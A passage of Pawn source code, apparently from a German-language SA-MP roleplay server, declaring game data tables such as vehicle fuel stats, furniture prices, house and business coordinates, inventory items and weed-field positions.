	{0x691E3BFF,22},
	{0x3F3E45FF,25},
	{0x3D4A68FF,28},
	{0x421F21FF,30},
	{0x5F272BFF,31},
	{0x8494ABFF,32},
	{0x767B7CFF,33},
	{0x252527FF,35},
	{0x221918FF,36},
	{0x6F675FFF,41},
	{0x7C1C2AFF,42},
	{0x5F0A15FF,43},
	{0x193826FF,44},
	{0x9D9872FF,46},
	{0xADB0B0FF,49},
	{0x304F45FF,51},
	{0x162248FF,53},
	{0x272F4BFF,54},
	{0x4E6881FF,59},
	{0x917347FF,61},
	{0x8E8C46FF,65},
	{0xAAAD8EFF,68},
	{0x6F8297FF,71},
	{0xAA9D84FF,77},
	{0x0E316DFF,79},
	{0x4D322FFF,84},
 	{0x7C1B44FF,85},
 	{0x2E5B20FF,86},
	{0x364155FF,91},
	{0x6D6C6EFF,92},
	{0x0F6A89FF,93},
	{0x204B6BFF,94},
	{0x4D8495FF,97},
	{0x96816CFF,99},
	{0x105082FF,103},
	{0x385694FF,108},
	{0x7F6956FF,110},
	{0x8C929AFF,111},
	{0x44624FFF,114},
	{0xA3ADC6FF,118},
	{0x695853FF,119},
	{0x624428FF,123},
	{0xEC6AAEFF,126},
	{0x000000FF,0}
};

new HausBrenndauer[7],FeuerLoeschen[7][6],HausFeuer[7][6],Float:FeuerPos[7][6][3] = {
{
	{4042.95410, -9265.15723, 8.68340},
	{4043.20239, -9274.17383, 3.38667},
	{4045.93579, -9291.61035, 9.02353},
	{4056.64111, -9283.90234, 3.41511},
	{4055.62134, -9267.12305, 4.35196},
	{4056.62671, -9276.29883, 8.65063} //Trucker Depot Feuer
},
{
	{5593.79150, -9334.51855, 3.39269},
	{5597.19336, -9325.68066, 3.39269},
	{5631.78906, -9316.54980, 3.39269},
	{5606.16357, -9318.15625, 3.39269},
	{5594.11426, -9348.48145, 3.39269},
	{5619.77051, -9317.98047, 3.39269}//Farm Feldbrand
},
{
	{6289.90918, -7831.93799, 3.35215},
	{6302.65918, -7832.29785, 3.35215},
	{6309.71533, -7831.40967, 3.35215},
	{6314.73193, -7831.92871, 7.83037},
	{6296.10791, -7838.59326, 3.57044},
	{6308.23730, -7837.98242, 3.57044}//Tankstelle SF Brand
},
{
	{1699.49402, -8823.60059, 3.30072},//Ballas
	{1698.47937, -8816.77441, 7.40131},
	{1697.37012, -8816.65332, 3.30072},
	{1699.54187, -8823.50098, 7.40131},
	{1699.40247, -8828.58789, 7.60432},
	{1699.41711, -8834.17285, 3.04633}

},
{
	{4457.93799, -7577.51367, 9.36495}, //Portland
	{4458.47314, -7581.60352, 8.41128},
	{4445.01270, -7577.28223, 9.36495},
	{4453.54785, -7589.53857, 6.21219},
	{4444.84424, -7590.44873, 9.09466},
	{4444.84814, -7583.24658, 10.9551}
},
{
	{6401.55176, -7819.53955, 3.25380}, //SF Friedhof
	{6407.31396, -7818.13867, 5.35369},
	{6401.84863, -7803.66797, 5.34965},
	{6394.41211, -7819.31836, 4.50242},
	{6399.01270, -7799.99756, 3.31069},
	{6396.44873, -7825.01465, 5.96999}
},
{
	{1640.5206,  -9517.1729,  4.9950},//Haus LS nahe LSPD
	{1649.64978, -9536.25391, 3.56415},
	{1631.18311, -9538.08105, 9.65701},
	{1608.68823, -9537.82129, 5.63124},
	{1608.27356, -9528.73047, 10.6687},
	{1612.33630, -9518.15430, 5.64600}//{1607.86633, -9511.29980, 10.3200}
}
};

new Mueltonnen[50][2],MueltonnenCount = 0,MueltonneChoosen[MAX_PLAYERS],MueltonneGeleert[50];

new SkinModelle[11][7] = {
{280,281,282,283,284,288,285},
{163,164,165,166,286,0,0},
{70,71,72,144,274,275,276},
{277,278,279,0,0,0,0},
{6,8,15,46,50,98,0},
{59,171,172,189,0,0,0},
{0,0,0,0,0,0,0},
{86,105,106,107,269,270,0},
{114,115,116,173,174,175,0},
{111,112,113,117,118,125,0},//Russiche
{120,121,122,123,126,186,0}
};

new KFZAbk[17][5] = {
"LSPD",
"SFPD",
"FRSF",
"FRLS",
"TS",
"Radi",
"Ball",
"Grov",
"Atze",
"LCN",
"Yak",
"Hit",
"MDSF",
"FDLV",
"Army",
"Vago",
"Bike"
};

enum aValue
{
	AutoName[30],
	MaxBenzin,
	aKraftstoff, //0-Diesel,1-Benin
	aVerbrauch
}

new AutoDaten[][aValue] = {
   {" ------- ",0},
   {"Landstalker",80,1,12}, //Name,MaxTank,Kraftstoff(0 = Diesel,1 = Benzin),Verbrauch auf 100km
   {"Bravura",70,0,8},
   {"Buffalo",80,0,14},
   {"Linerunner",400,0,23},
   {"Pereniel",60,0,10},
   {"Sentinel",80,1,10},
   {"Dumper",1000,0,40},
   {"Firetruck",120,1,12},
   {"Trashmaster",120,0,12},
   {"Stretch",100,1,15},
   {"Manana",60,1,7},
   {"Infernus",80,0,17},
   {"Voodoo",80,0,12},
   {"Pony",80,0,11},
   {"Mule",100,1,16},
   {"Cheetah",70,0,13},
   {"Ambulance",90,1,14},
   {"Leviathan",2000,2,200},
   {"Moonbeam",70,0,15},
   {"Esperanto",65,1,11},
   {"Taxi",80,1,7},
   {"Washington",60,0,8},
   {"Bobcat",80,0,11},
   {"Mr Whoopee",90,0,15},
   {"BF Injection",50,0,8},
   {"Hunter",2000,2,70},
   {"Premier",80,1,9},
   {"Enforcer",100,0,15},
   {"Securicar",130,0,20},
   {"Banshee",70,0,12},
   {"Predator",150,0,25},
   {"Bus",200,0,25},
   {"Rhino",1000,0,60},
   {"Barracks",100,0,15},
   {"Hotknife",80,1,14},
   {"Trailer",0,0,0},
   {"Previon",60,0,8},
   {"Coach",120,0,16},
   {"Cabbie",80,0,12},
   {"Stallion",70,1,11},
   {"Rumpo",100,1,15},
   {"RC Bandit",40,0,0},
   {"Romero",90,0,11},
   {"Packer",150,0,24},
   {"Monster",100,0,20},
   {"Admiral",80,1,11},
   {"Squalo",300,0,44},
   {"Seasparrow",2000,0,60},
   {"Pizzaboy",30,0,5},
   {"Tram",40,0,},
   {"Trailer2",40,0,},
   {"Turismo",80,1,16},
   {"Speeder",230,0,29},
   {"Reefer",260,0,50},
   {"Tropic",300,0,40},
   {"Flatbed",120,1,30},
   {"Yankee",80,0,15},
   {"Caddy",40,0,1},
   {"Solair",80,1,9},
   {"Berkley's RC Van",90,1,16},
   {"Skimmer",3000,0,300},
   {"PCJ-600",50,1,7},
   {"Roller",30,0,7},
   {"Freeway",50,1,14},
   {"RC Baron",40,0,0},
   {"RC Raider",40,0,0},
   {"Glendale",70,0,12},
   {"Oceanic",70,0,12},
   {"Sanchez",40,1,8},
   {"Sparrow",2000,2,180},
   {"Patriot",120,0,23},
   {"Quad",40,1,9},
   {"Coastguard",240,0,26},
   {"Dinghy",90,0,25},
   {"Hermes",70,0,15},
   {"Sabre",80,0,14},
   {"Rustler",2000,2,250},
   {"ZR-350",80,1,18},
   {"Walton",80,0,17},
   {"Regina",75,0,12},
   {"Comet",90,1,12},
   {"Fahrrad",40,0,0},
   {"Burrito",110,0,17},
   {"Camper",80,0,23},
   {"Marquis",200,0,40},
   {"Baggage",20,1,7},
   {"Dozer",200,0,28},
   {"Maverick",2000,0,240},
   {"News Chopper",2000,0,200},
   {"Rancher",120,0,18},
   {"FBI Rancher",120,0,18},
   {"Virgo",70,1,14},
   {"Greenwood",75,0,13},
   {"Jetmax",400,0,60},
   {"Hotring",100,1,19},
   {"Sandking",150,0,23},
   {"Blista Compact",60,1,9},
   {"Police Maverick",2000,0,230},
   {"Boxville",80,0,20},
   {"Benson",80,0,17},
   {"Mesa",75,1,12},
   {"RC Goblin",40,0,0},
   {"Hotring Racer",100,1,19},
   {"Hotring Racer2",100,1,19},
   {"Bloodring Banger",100,1,19},
   {"Rancher2",80,1,18},
   {"Super GT",80,1,17},
   {"Elegant",70,0,9},
   {"Journey",120,0,18},
   {"Bike",40,0,0},
   {"Mountain",40,0,0},
   {"Beagle",5000,2,670},
   {"Cropdust",2500,2,570},
   {"Stunt",3500,2,630},
   {"Tanker",300,0,45},
   {"RoadTrain",350,0,45},
   {"Nebula",90,1,12},
   {"Majestic",75,0,11},
   {"Buccaneer",70,0,16},
   {"Shamal",11000,0,1200},
   {"Hydra",6000,0,780},
   {"FCR-900",50,1,12},
   {"NRG-500",50,1,14},
   {"HPV1000",50,1,12},
   {"Cement Truck",150,0,23},
   {"Tow Truck",90,0,20},
   {"Fortune",60,0,9},
   {"Cadrona",65,0,10},
   {"FBI Truck",80,1,16},
   {"Willard",60,0,9},
   {"Forklift",35,1,5},
   {"Traktor",50,0,12},
   {"Combine",150,0,31},
   {"Feltzer",70,0,12},
   {"Remington",80,0,17},
   {"Slamvan",70,0,17},
   {"Blade",70,0,17},
   {"Freight",500,0,70},
   {"Streak",500,0,70},
   {"Vortex",40,1,15},
   {"Vincent",40,1,},
   {"Bullet",100,1,26},
   {"Clover",60,0,12},
   {"Sadler",75,0,18},
   {"Firetruck",150,0,31},
   {"Hustler",50,0,14},
   {"Intruder",70,0,9},
   {"Primo",65,0,9},
   {"Cargobob",2000,2,250},
   {"Tampa",70,0,12},
   {"Sunrise",80,1,14},
   {"Merit",70,0,12},
   {"Utility",80,0,17},
   {"Nevada",8000,2,900},
   {"Yosemite",150,0,34},
   {"Windsor",40,0,},
   {"Monster2",150,0,34},
   {"Monster Truck",150,0,34},
   {"Uranus",80,1,18},
   {"Jester",80,1,18},
   {"Sultan",80,1,18},
   {"Stratum",80,1,18},
   {"Elegy",80,1,18},
   {"Raindance",2000,2,270},
   {"RC Tiger",40,0,0},
   {"Flash",80,1,14},
   {"Tahoma",70,0,12},
   {"Savanna",60,0,14},
   {"Bandito",40,0,15},
   {"Freight",40,0,0},
   {"Trailer3",40,0,0},
   {"Kart",25,1,5},
   {"Mower",20,0,5},
   {"Duneride",120,0,2},
   {"Sweeper",40,0,12},
   {"Broadway",80,0,20},
   {"Tornado",80,0,20},
   {"AT-400",20000,2,3600},
   {"DFT-30",120,0,29},
   {"Huntley",80,0,20},
   {"Stafford",70,0,19},
   {"BF-400",30,0,10},
   {"Newsvan",80,0,17},
   {"Tug",20,0,5},
   {"Trailer4",40,0,0},
   {"Emperor",75,0,14},
   {"Wayfarer",40,0,10},
   {"Euros",70,1,18},
   {"Hotdog",80,0,25},
   {"Club",60,0,7},
   {"Trailer5",40,0,0},
   {"Trailer6",40,0,0},
   {"Andromada",22000,2,4300},
   {"Dodo",4000,2,450},
   {"RC Cam",40,0,0},
   {"Launch",130,0,26},
   {"Streifenwagen LS",70,1,11},
   {"Streifenwagen SF",70,1,11},
   {"Streifenwagen LV",70,1,11},
   {"Polizei Ranger",80,1,16},
   {"Picador",75,0,18},
   {"S.W.A.T. Van",120,0,35},
   {"Alpha",70,1,15},
   {"Phoenix",80,0,24},
   {"Glendale",80,0,19},
   {"Sadler",80,0,23},
   {"Luggage Trailer",40,0,0},
   {"Luggage Trailer2",40,0,0},
   {"Stair Trailer",40,0,0},
   {"Boxville",100,0,26},
   {"Farm Plow",40,0,0},
   {"Utility Trailer",40,0,0}
};

enum moebelhaus
{
	MHModell,
	Float:MHPreis
}

forward tree_timer();new baumTM;new Text3D:baum_state;new baum_obj;
new Float:baum_umgefallen[][5] =
{
	{1889.41174, -9309.44531, 3.66120,90.00,0.0},
	{1828.19470, -9110.18555, 3.59720,135.00,0.0},
	{4327.19043, -7823.36475, 3.67190,25.00,0.0},
	{6451.89697, -7863.66309, 5.24220,98.00,0.0},
	{6341.48340, -8176.78857, 3.71220,156.00,0.0},
	{6256.01074, -9287.63184, 3.82350,-84.00,0.0}
};

new MoebelPreise[][moebelhaus] = {
	{1491,1000.0},
	{1703,1000.0},
	{1753,1000.0},
	{1764,1000.0},
	{1757,1000.0},
	{1432,1000.0},
	{1679,1000.0},
	{2093,1000.0},
	{2296,1000.0},
	{2297,1000.0},
	{2964,1000.0},
	{949,1000.0},
	{2001,1000.0},
	{2011,1000.0},
	{2244,1000.0},
	{948,1000.0},
	{2131,1000.0},
	{2133,1000.0},
	{2141,1000.0},
	{2334,1000.0},
	{2132,1000.0},
	{2338,1000.0},
	{2336,1000.0},
	{2298,1000.0},
	{2301,1000.0},
	{2299,1000.0},
	{1796,1000.0},
	{2559,1000.0},
	{2514,1000.0},
	{2525,1000.0},
	{2528,1000.0},
	{2523,1000.0},
	{2524,1000.0},
	{2527,1000.0},
	{2526,1000.0},
	{2519,1000.0},
	{1998,1000.0},
	{2165,1000.0},
	{2605,1000.0},
	{1722,1000.0},
	{2310,1000.0},
	{1671,1000.0},
	{2204,1000.0},
	{2078,1000.0},
	{2278,1000.0},
	{2279,1000.0},
	{2282,1000.0},
	{19317,1000.0},
	{19318,1000.0},
	{19319,1000.0}
};
enum bDaten
{
	Float:bSchildX,
	Float:bSchildY,
	Float:bSchildZ,
	Float:bSchildRX,
	Float:bSchildRY,
	Float:bSchildRZ,
	Float:bNummerX,
	Float:bNummerY,
	Float:bNummerZ,
	Float:bNummerRX,
	Float:bNummerRY,
	Float:bNummerRZ
};
// anklickschild: (19470,
//Schild für Nummer:(19327,


/*
0 - Skin Sop LS
1 - 24/7 LS
2 - BSN LS
3 - Parkhausls
4 - Waffenladen
5 - Fahrschule
6 - Eventpark
7 - Pizza SF
8 - 24/7 LV
9 - Schrottplatz
10 - Tankstelle SF
11 - Tankstelle LS
12 - Tankstelle LV


*/
new BizDaten[13][bDaten] = {
    {1776.83069, -9310.79785, 3.31410,   0.00000, 0.00000, 69.00000,  1776.79639, -9311.13281, 6.48790,   0.00000, 0.00000, 180.00000},//Skin Shop LS
    {1607.25684, -9339.83691, 5.48110,   0.00000, 0.00000, -181.00000,  1607.74011, -9339.58691, 9.16580,   0.00000, 0.00000, -90.00000},//24/7 LS
    {1775.29407, -9192.62988, 3.41284,   0.00000, 0.00000, 0.00000,  1774.37537, -9192.27832, 7.59360,   0.00000, 0.00000, 90.00000},//BSN LS
    {1781.49646, -8910.55566, 3.20231,   0.00000, 0.00000, 0.00000,  1780.89575, -8910.56543, 6.78620,   0.00000, 0.00000, 90.00000},//parkhausls
    {1603.54565, -8447.23340, 0.90773,   0.00000, 0.00000, -55.00000,  1604.01758, -8445.76172, 4.18170,   0.00000, 0.00000, 37.00000},//waffenladen
	{1585.76746, -8443.21387, 0.96701,   0.00000, 0.00000, 178.00000,  1586.14282, -8443.05762, 4.19070,   0.00000, 0.00000, -90.00000},//fahrschule ls
	{6494.47656, -7649.37109, 3.60241,   0.00000, 0.00000, 207.00000,  6495.55371, -7649.33057, 7.67020,   0.00000, 0.00000, -90.00000},//eventpark
	{6593.49219, -7873.40967, 3.19516,   0.00000, 0.00000, 94.00000,  6591.33057, -7873.93799, 7.37660,   0.00000, 0.00000, 180.00000},//pizza sf
	{6413.74463, -9149.49023, 3.30481,   0.00000, 0.00000, -149.00000,  6414.26172, -9149.52930, 5.86100,   0.00000, 0.00000, -90.00000},//24/7 LV
	{6510.83398, -7778.84766, 3.31950,   0.00000, 0.00000, 178.00000,  6511.55908, -7778.89307, 4.93150,   0.00000, 0.00000, -90.00000},//schrottplatz
    {6315.08252, -7829.67041, 3.19504,   0.00000, 0.00000, 0.00000,  6314.58252, -7830.15967, 6.12200,   0.00000, 0.00000, 90.00000},//tankesf
    {2480.66406, -9319.51953, 3.21793,   0.00000, 0.00000, -193.00000,  2481.06836, -9319.80957, 6.29905,   0.00000, 0.00000, -90.00000},//tankels
    {5410.27393, -9276.33887, 3.28796,   0.00000, 0.00000, -33.00000,  5409.80713, -9275.39453, 5.77640,   0.00000, 0.00000, 90.00000}//tankelv
};
#define MAX_BIZ 13
enum bInfo
{
	bid,
	bbesitzer,
	bname[MAX_PLAYER_NAME],
	bnummer,
	btankstelle,
	Float:bdieselpreis,
	Float:bbenzinpreis,
	bprodukte,
	Float:bpreis,
	Float:bkasse,
	bSchild,
	bSprit,
	bNummers
}
new BizInfo[MAX_BIZ][bInfo];
enum hDaten
{
	Float:hSchildX,
	Float:hSchildY,
	Float:hSchildZ,
	Float:hSchildRX,
	Float:hSchildRY,
	Float:hSchildRZ,
	Float:hNummerX,
	Float:hNummerY,
	Float:hNummerZ,
	Float:hNummerRX,
	Float:hNummerRY,
	Float:hNummerRZ
};
new HausDaten[11][hDaten] = {
    {1768.30469, -9535.19727, 3.75090,   0.00000, 0.00000, -47.00000,  1764.25122, -9529.77246, 6.11570,   0.00000, 0.00000, 90.00000},//Haus 1 fertig
    {1741.84021, -9535.50586, 3.75090,   0.00000, 0.00000, -47.00000,  1737.58423, -9529.92285, 6.11570,   0.00000, 0.00000, 90.00000},//Haus 2 fertig
    {1715.03552, -9535.82715, 3.75090,   0.00000, 0.00000, -47.00000,  1710.92322, -9529.78711, 6.23570,   0.00000, 0.00000, 90.00000},//Haus 3 fertig
    {1688.4791, -9535.5684, 3.7509,      0.0000,  0.0000, -47.0000,    1684.2567, -9529.7647, 6.2420,      0.00000, 0.00000, 90.00000},//Haus 4 fertig
    {1762.79468, -9452.72363, 3.75090,   0.00000, 0.00000, 120.00000,  1766.5432, -9458.4424, 6.2434,      0.0000, 0.0000, -90.0000}, //Haus 5 fertig
    {1736.1656, -9452.4717, 3.7509,      0.0000, 0.0000, 120.0000,     1739.8743, -9458.4783, 6.2107,      0.0000, 0.0000, -90.0000}, //Haus 6 fertig
    {1708.9752, -9451.0811, 3.7549,      0.0000, 0.0000, 120.0000,     1713.2103, -9458.4783, 6.2107,      0.0000, 0.0000, -90.0000}, //Haus 7 fertig
    {1682.7426, -9451.8350, 3.7549,      0.0000, 0.0000, 120.0000,     1686.5427, -9458.4783, 6.2107,      0.0000, 0.0000, -90.0000}, //Haus 8 fertig
    {1579.6155, -9413.1211, 5.5201,      0.0000, 4.0000, -11.0000,     1561.4739, -9397.5107, 8.3119,      0.0000, 0.0000, 90.0000},//Villa 9
    {1579.4301, -9367.1436, 5.5201,      0.0000, 4.0000, -11.0000,     1561.4709, -9351.3242, 8.3119,      0.0000, 0.0000, 90.0000},//Villa 10
    {1579.0553, -9336.0654, 5.5201,      0.0000, 4.0000, -11.0000,     1561.4885, -9320.0723, 8.3119,      0.0000, 0.0000, 90.0000} //Villa 11
};
//Schild (19327, 1710.92322, -9529.78711, 6.23570,   0.00000, 0.00000, 90.00000);

new Float:HausAreaDaten[11][] = {
{1778.5544,-9541.3984,	1778.5466,-9512.4229,	1753.0725,-9512.3086,	1752.9304,-9540.9922},//1
{1751.8872,-9541.6221,	1751.8781,-9512.4629,	1726.4089,-9512.2773,	1726.2659,-9541.0371},//2
{1725.2223,-9541.4189,  1725.2227,-9512.2686,   1699.5748,-9512.2637,   1699.5679,-9541.1934},//3
{1698.5552,-9541.3379,  1698.5551,-9512.2646,   1673.5598,-9512.2676,   1673.4043,-9541.1924},//4
{1752.2429,-9446.6816,  1752.2428,-9475.9102,   1777.4016,-9475.9131,   1777.4027,-9446.9834},//5
{1725.5756,-9446.9531,  1725.5764,-9475.9141,   1751.2267,-9475.9131,   1751.2300,-9446.9824},//6
{1698.9098,-9446.8193,  1698.9097,-9475.9141,   1724.5576,-9475.9141,   1724.5616,-9446.9893},//7
{1672.2430,-9446.8438,  1672.2426,-9475.9121,   1697.8936,-9475.9131,   1697.8958,-9446.9893},//8
{1579.6667,-9384.1387,  1518.2112,-9384.7920,   1518.2091,-9414.4502,   1579.5220,-9415.0098},//9Villa
{1579.7960,-9338.0195,  1518.2109,-9338.5479,   1518.2087,-9368.2070,   1579.5958,-9367.8203},//10Villa
{1579.7615,-9306.6475,  1518.2095,-9307.2979,   1518.2078,-9336.9580,   1579.7852,-9337.7051}//11Villa

};

new Float:MoebelInvView[][] = {
	{3820.97,-160.371322,102.13},
	{3808.64,-160.563186,102.13},
	{3796.93,-160.759002,102.13},
	{3820.97,-160.368804,95.63},
	{3808.64,-160.572555,95.63},
	{3796.37,-160.754226,95.63},
	{3820.97,-160.360290,87.70},
	{3808.64,-160.564025,87.70},
	{3796.91,-160.769470,87.70}
};

enum hInfo
{
	hArea,
	hNummer,
	hBriefkasten,
	hTuer,
	hTuerOpen,
	hTuerLocked,
	hTuer2,
	hTuer2Open,
	hTuer2Locked,
	hTuer3,
	hTuer3Open,
	hTuer3Locked,
	hTor,
	hTorModel,
	hTorOpen,
	hBesitzer,
	Float:hPreis,
	hName[MAX_PLAYER_NAME],
	hSchild,
	hErfahrung,
	Float:hMiete,
	hHotel,
	sphnummer,
	Float:hSpawnX,
	Float:hSpawnY,
	Float:hSpawnZ,
	Text3D:Schildlabel
}

new HausInfo[MAX_HAEUSER][hInfo];

#define MAX_ROLLER 21
new Rollernew[21];
enum drogensys
{
	drogenid,
	drogenzeit,
	Text3D:drogenlabel,
	Float:dX,
	Float:dY,
	Float:dZ,
	drogenobject
}
new CDrogen[MAX_PLAYERS][drogensys];
new rollmeet[MAX_PLAYERS],hathand[MAX_PLAYERS],cpaktiv[MAX_PLAYERS],Fahrschulcp[MAX_PLAYERS],Fahrstunde[MAX_PLAYERS],istdrinne[MAX_PLAYERS];
new rollmeet2[MAX_PLAYERS];
new hatobject[MAX_PLAYERS];
new Float:AutohausParkplaetze[][4] =
{
	{6574.3970,-7834.8462,4.0346,179.7202},
	{6579.2324,-7835.0737,4.0344,179.3989},
	{6584.5674,-7835.0713,4.0346,181.4880},
	{6589.3726,-7835.3423,4.0346,180.1872},
	{6594.2837,-7835.6953,4.0345,179.7079},
	{6599.3081,-7835.4995,4.0346,180.2796},
	{6604.3999,-7835.3501,4.0345,180.2668},
	{6609.4004,-7835.4380,4.0346,180.2235}
};
new AutohausDaten[1][90][3] = {
	{
		{400,25400,166},
		{401,18800,155},
		{402,26300,197},
		{404,4500,140},
		{405,9700,173},
		{409,95300,167},
		{410,5200,137},
		{411,150000,235},
		{412,6800,178},
		{413,4900,116},
		{415,120000,203},
		{418,8400,122},
		{419,20000,157},
		{421,12600,162},
		{422,5900,148},
		{424,50200,143},
		{426,33600,183},
		{429,87400,213},
		{436,5300,157},
		{439,7500,178},
		{445,6300,173},
		{451,135000,204},
		{458,5900,166},
		{459,6100,143},
		{461,35300,168},
		{462,2100,117},
		{463,23400,154},
		{466,9200,155},
		{467,10800,148},
		{468,25200,155},
		{471,18400,115},
		{474,15400,157},
		{475,8000,182},
		{477,80000,197},
		{479,11300,148},
		{480,21200,194},
		{482,7500,165},
		{483,18000,129},
		{489,33200,147},
		{491,26300,157},
		{492,20100,148},
		{496,8400,172},
		{500,23600,148},
		{506,120300,189},
		{507,22000,175},
		{508,65000,114},
		{516,16000,166},
		{517,20100,166},
		{518,17600,173},
		{521,55000,170},
		{522,145000,185},
		{526,19900,166},
		{527,15300,157},
		{529,13800,157},
		{533,9400,176},
		{534,10500,178},
		{535,100000,167},
		{536,12000,182},
		{540,8900,157},
		{541,123900,214},
		{542,3900,173},
		{543,2800,159},
		{545,88000,155},
		{546,9300,157},
		{547,10600,150},
		{549,4500,162},
		{550,13900,153},
		{551,7000,166},
		{554,39900,152},
		{555,6800,168},
		{558,7200,165},
		{559,24000,187},
		{560,63000,178},
		{561,16500,162},
		{562,23700,187},
		{565,18800,174},
		{566,8100,168},
		{567,24800,182},
		{575,7800,166},
		{576,8200,166},
		{579,45000,166},
		{580,14400,161},
		{581,18000,161},
		{585,8900,161},
		{586,43400,151},
		{587,44200,174},
		{589,21100,171},
		{600,8100,159},
		{602,15500,178},
		{603,11100,181}
	}
};

enum ivalue
{
	iID,
	Float:iZoom,
	iModell
}

new InventarValues[34][ivalue] = {
{346,1.0,22},//9mm
{347,1.0,23},//SD
{348,1.0,24},//Deagel
{349,1.0,25},//Shotgun
{350,1.0,26},//Combat
{351,1.0,27},//Sawn off
{352,1.0,28},//SMG
{353,1.0,29},//MP5
{355,2.0,30},//AK
{356,2.0,31},//M4
{357,2.0,33},//Jagdgewehr
{358,2.0,34},//Sniper
{372,2.0,32},//Tec9
{19346,1.5,19346},//Hotdog
{16304,1.0,16304},//Weed
{1578,1.0,1578},//Gras
{3096,1.0,3096},//Werkzeugkit
{1575,1.0,1575},//Koks
{1604,1.0,1604},//Illegaler FIsch
{1600,1.0,1599},//Legaler Fisch
{18632,1.0,18632},//Angel
{1486,1.0,1486},//Pfandflasche
{1599,1.0,1599},//neu
{19630,1.0,19630},//Hering
{902,1.0,902},//seestern
{1603,1.0,1603},//qualle
{1609,1.0,1609},//Schildkröte
{1607,1.0,1607},//Delfin
{1608,1.0,1608},//hai
{1654,1.0,1654},//Bombe
{2226,1.0,2226},//Box
{1650,1.0,1650},//Benzin
{19942,1.0,19942},//Handy
{1463,1.0,1463}//Holz
};



new FrakWaffen[4][5][2] = {
	{
		{1,50},
		{24,1200},
		{25,1400},
		{32,1900},
		{30,2500}
	},
	{
		{5,150},
		{22,1000},
		{25,1400},
		{28,2000},
		{30,2500}
	},
	{
		{15,200},
		{24,1200},
		{25,1400},
		{29,2400},
		{31,3000}
	},
	{
		{8,300},
		{23,1100},
		{26,2800},
		{29,2400},
		{31,3000}
	}
};

new MoebelhausListe[10][20] = {
"Waende",
"Schraenke",
"Sofas",
"Badezimmer",
"Betten",
"Kueche",
"Wohnzimmer",
"Dekoration",
"Garten",
"Sonstiges"
};

new MoebelStueck[10][24][2] = {
	{//Wände
	    {19353,30},
		{19383,20},
		{19426,10},
	    {19354,30},
		{19384,20},
		{19427,10},
	    {19356,30},
		{19386,20},
		{19429,10},
	    {19357,30},
		{19387,20},
		{19430,10},
	    {19358,30},
		{19388,20},
		{19431,10},
	    {19359,30},
		{19389,20},
		{19432,10},
	    {19361,30},
		{19390,20},
		{19434,10},
	    {19363,30},
		{19392,20},
		{19436,10}
	},
	{//Schränke
		{14556,200},
		{1417,200},
		{14867,2000},
		{911,500},
		{912,550},
		{913,560},
		{1743,600},
		{2329,733},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0}
	},
	{//Sofas
		{1702,300},
		{1703,350},
		{1706,250},
		{1710,400},
		{1713,320},
		{2290,360},
		{1764,320},
		{1760,270},
		{1704,150},
		{1705,150},
		{11717,250},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0}
	},
	{//Bad
		{2514,160},
		{2521,175},
		{2525,192},
		{2528,170},
		{2518,100},
		{2523,120},
		{2524,135},
		{2515,110},
		{2097,190},
		{2516,220},
		{2519,230},
		{2526,225},
		{2517,230},
		{2527,215},
		{11707,85},
		{19873,2},
		{19874,3},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0}
	},
	{//Betten
		{1794,500},
		{1795,550},
		{1797,580},
		{1798,490},
		{2299,485},
		{2301,678},
		{2566,720},
		{11731,1800},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0},
		{0,0}
	},
	{//Küche
		{2135,230},
		{2294,270},
		{2339,250},
		{2417,200},
		{2013,550},
		{2130,485},
		{2132,493},
		{2136,480},
		{2131,425},
		{2133,405},
		{2141,550},
		{2140,520},
		{2139,475},
		{2128,500},
		{2127,435},
		{11718,400},
		{19916,380},
		{19926,500},
		{19925,500},
		{19927,840},
		{19929,700},
		{19933,850},
		{19924,420},
		{19923,300}
	},
	{//Wohnzimmer
		{1516,190},
		{1594,450},
		{1825,560},
		{827,360},
		{2311,120},
		{2313,140},
		{2321,155},
		{2802,375},
		{2763,130},
		{1671,90},
		{1720,80},
		{1739,95},
		{1811,87},
		{2636,83},
		{11724,850},
		{11725,1100},
		{11686,4000},
		{11689,3800},
		{19999,250},
		{19317,230},
		{0,0},
		{0,0},
		{0,0},
		{0,0}
	},
	{//Deko
		{2815,30},
		{2817,37},
		{2818,32},
		{2833,51},
		{2834,52},
		{2835,56},
		{2842,62},
		{2847,57},
		{949,50},
		{950,55},
		{2001,60},
		{2011,70},
		{2195,45},
		{2240,52},
		{2244,47},
		{2249,35},
		{2253,50},
		{11737,90},
		{11726,200},
		{11734,120},
		{11733,210},
		{11706,80},
		{19581,24},
		{19584,21}
	},
	{//garten
		{1281,220},
		{642,65},
		{1231,40},
		{1255,235},
		{1645,242},
		{1646,246},
		{1647,242},
		{1215,40},
		{3472,80},
		{1481,80},
		{19867,120},
		{19831,150},
		{625,52},
		{626,55},
		{627,56},
		{628,85},
		{803,80},
		{1360,250},
		{1364,300},
		{653,210},
		{3525,159},
		{16151,5400},
		{0,0},
		{0,0}
	},
	{//Sonstiges
		{2964,1500},
		{19474,1350},
		{16151,2500},
		{14806,180},
		{1839,110},
		{1429,215},
		{1518,225},
		{1752,290},
		{1792,312},
		{2224,320},
		{2596,275},
		{2190,300},
		{11743,450},
		{19830,80},
		{19825,20},
		{19814,25},
		{19806,185},
		{19807,125},
		{19893,385},
		{19818,6},
		{19819,8},
		{19820,18},
		{19821,42},
		{19609,380}
	}
};

new JobNamen[6][20] = {
"Müllmann",
"Taxifahrer",
"Busfahrer",
"Farmer",
"Trucker",
"Holzfäller"
};

new ADACZone[10],azoneid = 1,AufzugZone,CasinoZone,BSZone,ShopZone,KleidungZone,MoebelZone,SpawnZone,FSHausZone,FSZone;

new WeedStatus[206],Weed[206];
new Float:Felder[206][2] = {
{5596.17725, -9328.17578},
{5595.54395, -9336.65039},
{5595.88721, -9345.09082},
{5595.63721, -9352.02148},
{5600.64795, -9320.59082},
{5600.75732, -9328.04785},
{5600.24121, -9336.48730},
{5600.13818, -9345.37402},
{5600.51807, -9351.86719},
{5606.21533, -9319.42676},
{5605.84229, -9327.96484},
{5604.62061, -9335.77441},
